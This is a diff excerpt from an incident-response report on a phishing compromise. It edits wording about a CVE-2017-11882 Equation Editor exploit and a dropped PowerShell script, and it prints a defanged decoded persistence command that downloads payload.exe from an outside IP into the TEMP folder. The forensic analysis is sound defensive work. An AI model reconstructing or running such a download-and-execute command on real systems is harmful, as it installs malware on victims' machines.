@@ -123,8 +123,8 @@ AlphaFinance Group detected suspicious activity after a finance employee accesse
 - Version: `15.0.4420.1017` (observed — SOFTWARE hive)
 - Exploit attribution: Word → Equation Editor (`EQNEDT32.EXE`), `CVE-2017-11882` — range-reported; the completed Q/A record contains no `WINWORD.EXE` or `EQNEDT32.EXE` process record establishing that sequence independently
 
-#### Dropper / Execution Chain (Defanged)
-- Script dropped:
+#### Script Creation and Execution (Defanged)
+- Script created:
   - `C:\Users\harrisr\AppData\Local\Temp\msupdate.ps1`
   - Created: `2025-05-23 11:15:43 UTC` (MFT)
 - Range-characterized process spoofing:
@@ -132,7 +132,7 @@ AlphaFinance Group detected suspicious activity after a finance employee accesse
 
 **Encoded persistence command decoded (DEFANGED / non-executable representation):**
 ```
-$env:TEMP -> used as staging directory
+$env:TEMP -> destination directory named in the encoded command
 $fileName = "msupdate-<random4>.exe"
 
 Inv0ke-WebReque st -Uri "hxxp[://]63[.]176[.]96[.]97[ / ]payload[.]exe" -OutFile "<TEMP>\<fileName>"
